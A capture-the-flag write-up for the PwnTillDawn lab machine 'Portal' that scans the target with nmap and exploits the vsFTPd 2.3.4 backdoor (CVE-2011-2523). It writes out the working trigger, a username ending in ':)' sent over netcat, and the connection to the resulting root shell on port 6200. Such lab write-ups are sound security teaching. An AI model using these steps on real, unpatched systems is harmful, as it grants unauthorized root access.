# Portal - PwnTillDawn

## Overview

This machine focuses on exploiting a vulnerable FTP service running an outdated version of **vsFTPd**.
The attack leverages a known backdoor vulnerability that provides remote root access to the target system.

---

# Reconnaissance

The first step was performing service enumeration using `nmap` to identify open ports, running services, and version information.

```bash id="6q1f8n"
nmap -sC -sV -O -p- 10.150.150.12
```

The scan revealed an FTP service running:

```text id="l8tq3m"
vsFTPd 2.3.4
```

This version is publicly known to be vulnerable to **CVE-2011-2523**, a malicious backdoor vulnerability that allows unauthorized remote shell access.

---

## Screenshot - Nmap Scan

<div align="center">
  <img src="assets/nmap_scan.png" alt="Nmap Output Scan" width="700">
  <p><em>Nmap Output Scan</em></p>
</div>

---

# Exploitation

The interesting part of this scan is the FTP, which is using "vsftpd 2.3.4". Check if this version has any vulnerabilities.

---

## Screenshot - Google Search of The Version Vulnerabilities

<div align="center">
  <img src="assets/research_version.png" alt="Google Search of The Version Vulnerabilities" width="500">
  <p><em>Google Search of The Version Vulnerabilities</em></p>
</div>

---

After confirming the vulnerable version, the next step was triggering the backdoor service.

Connect to the FTP service:

```bash id="v2mw0f"
nc 10.150.150.12 21
```
---

## Screenshot - Netcat To The Target

<div align="center">
  <img src="assets/netcat.png" alt="Netcat To The Target" width="400">
  <p><em>Netcat To The Target</em></p>
</div>

---

Send a username ending with the ASCII smiley `:)`.

Example:

```text id="7r9yxs"
USER anonymous:)
```

---

## Screenshot - The Magic Byte

<div align="center">
  <img src="assets/exploited_credential.png" alt="The Magic Byte" width="400">
  <p><em>The Magic Byte</em></p>
</div>

---

Any password can be entered afterward.

Once the payload is triggered, a shell becomes available on port `6200`.

Connect to it using:

```bash id="y5f1qd"
nc 10.150.150.12 6200
```

---

## Screenshot - Triggering The Backdoor

<div align="center">
  <img src="assets/exploit.png" alt="The Exploitation" width="400">
  <p><em>The Exploitation</em></p>
</div>

---

# Gaining Access

A successful connection to port `6200` returns a shell running as `root`.

Privilege level verification:

```bash id="j6e2zr"
whoami
id
```

The target immediately grants full administrative access.

---

## Screenshot - Root Shell Access

<div align="center">
  <img src="assets/rootshell.png" alt="Root Shell Confirmation" width="400">
  <p><em>Root Shell Confirmation</em></p>
</div>

---

# Post-Exploitation

With root access obtained, the remaining task was to enumerate the system further and locate the flag.

Typical post-exploitation steps included:

* Navigating the filesystem
* Checking user directories
* Searching for flag files
* Performing basic system enumeration

---

## Screenshot - Flag Discovery

<div align="center">
  <img src="assets/lateral_movement.png" alt="Find The Flag" width="400">
  <p><em>Find The Flag</em></p>
</div>

---

# Vulnerability Details

| Category        | Details                  |
| --------------- | ------------------------ |
| Service         | vsFTPd                   |
| Version         | 2.3.4                    |
| CVE             | CVE-2011-2523            |
| Impact          | Remote Command Execution |
| Privilege Level | Root                     |

---

# Lessons Learned

* Version enumeration is critical during reconnaissance.
* Legacy services often contain publicly available exploits.
* Misconfigured or outdated FTP services can lead to complete system compromise.
* Simple vulnerabilities can still result in full administrative access if systems are not patched.

---

# References

* CVE-2011-2523
* vsFTPd 2.3.4 Backdoor Exploit
